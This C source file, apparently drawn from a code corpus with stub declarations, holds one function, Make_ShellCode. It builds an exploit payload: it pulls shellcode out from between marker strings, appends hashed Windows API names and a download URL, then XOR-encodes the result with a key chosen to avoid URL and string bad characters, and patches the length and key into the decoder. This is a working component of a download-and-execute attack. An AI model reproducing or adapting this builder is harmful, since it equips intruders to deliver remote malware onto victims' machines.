#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int DECODE_LEN ; 
 unsigned int ENC_KEY ; 
 size_t ENC_KEY_OFFSET ; 
 unsigned long GetHash (char*) ; 
 int MAX_SC_LEN ; 
 size_t SC_LEN_OFFSET ; 
 scalar_t__ SEARCH_LEN ; 
 int /*<<< orphan*/  SEARCH_STR ; 
 int Sc_len ; 
 scalar_t__ ShellCode ; 
 int /*<<< orphan*/  exit (int) ; 
 char** functions ; 
 scalar_t__ memcmp (unsigned char*,int /*<<< orphan*/ ,scalar_t__) ; 
 int /*<<< orphan*/  memcpy (int*,...) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int* sc ; 
 int strlen (char*) ; 

void Make_ShellCode(char *url1)
{
   unsigned char  *pSc_addr;
   unsigned int   Enc_key=ENC_KEY;
   unsigned long  dwHash[100];
   unsigned int   dwHashSize;
   int i,j,k,l;


   // Get functions hash
   //printf("[+] Get functions hash strings.\r\n");
   for (i=0;;i++)
   {
       if (functions[i][0] == '\x0') break;

       dwHash[i] = GetHash((char*)functions[i]);
       //printf("\t%.8X\t%s\n", dwHash[i], functions[i]);
   }
   dwHashSize = i*4;


   // Deal with shellcode
   pSc_addr = (unsigned char *)ShellCode;

   for (k=0;k<MAX_SC_LEN;++k )
   {
       if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0)
       {
           break;
       }
   }
   pSc_addr+=(k+SEARCH_LEN);               // Start of the ShellCode

   for (k=0;k<MAX_SC_LEN;++k)
   {
       if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) {
           break;
       }
   }
   Sc_len=k;                               // Length of the ShellCode

   memcpy(sc, pSc_addr, Sc_len);           // Copy shellcode to sc[]


   // Add functions hash
   memcpy(sc+Sc_len, (char *)dwHash, dwHashSize);
   Sc_len += dwHashSize;

   // Add url
   memcpy(sc+Sc_len, url1, strlen(url1)+1);
   Sc_len += strlen(url1)+1;

   // Deal with find the right XOR byte
   for(i=0xff; i>0; i--)
   {
       l = 0;
       for(j=DECODE_LEN; j<Sc_len; j++)
       {
           if (
                  ((sc[j] ^ i) == 0x26) || //%
                  ((sc[j] ^ i) == 0x3d) || //=
                  ((sc[j] ^ i) == 0x3f) || //?
                  ((sc[j] ^ i) == 0x40) || //@
                  ((sc[j] ^ i) == 0x00) ||
                  ((sc[j] ^ i) == 0x0D) ||
                  ((sc[j] ^ i) == 0x0A)
               )                           // Define Bad Characters
           {
               l++;                        // If found the right XOR byte&#65292;l equals 0
               break;
           };
       }

       if (l==0)
       {
           Enc_key = i;

           printf("[+] Find XOR Byte: 0x%02X\n", i);
           for(j=DECODE_LEN; j<Sc_len; j++)
           {
               sc[j] ^= Enc_key;
           }

           break;                          // If found the right XOR byte, Break
       }
   }

   // Deal with not found XOR byte
   if (l!=0)
  {
       printf("[-] No xor byte found!\r\n");
       exit(-1);
   }

   // Deal with DeCode string
   *(unsigned char *)&sc[SC_LEN_OFFSET] = Sc_len;
   *(unsigned char *)&sc[ENC_KEY_OFFSET] = Enc_key;

   printf("[+] download url:%s\n", url1);
}